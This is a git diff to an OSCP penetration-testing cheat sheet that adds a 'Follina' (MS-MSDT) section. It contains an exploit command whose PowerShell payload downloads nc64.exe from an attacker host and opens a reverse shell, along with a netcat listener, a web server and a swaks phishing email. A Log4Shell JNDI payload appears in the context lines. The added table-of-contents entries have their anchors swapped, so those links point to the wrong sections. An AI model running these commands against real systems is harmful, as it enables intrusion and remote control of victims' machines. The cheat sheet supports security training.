@@ -150,7 +150,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 	- [CVE](https://github.com/0xsyr0/OSCP#cve)
 		- [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/OSCP#dirty-pipe-cve-2022-0847)
 		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
-		- [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/OSCP#log4j--log4shell-cve2021-44228)
+		- [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/OSCP#ms-msdt-follina)
+		- [MS-MSDT "Follina"](https://github.com/0xsyr0/OSCP#log4j--log4shell-cve2021-44228)
 		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
 		- [ShellShock](https://github.com/0xsyr0/OSCP#shellshock)
 		- [Shocker](https://github.com/0xsyr0/OSCP#shocker)
@@ -3640,6 +3641,26 @@ nc -lnvp 9001
 
 ```c
 curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
+```
+
+#### MS-MSDT "Follina"
+
+> https://github.com/JohnHammond/msdt-follina
+
+```c
+python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
+```
+
+```c
+python3 -m http.server 8000
+```
+
+```c
+nc -lnvp <LPORT>
+```
+
+```c
+swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 ```
 
 #### SharpEfsPotato
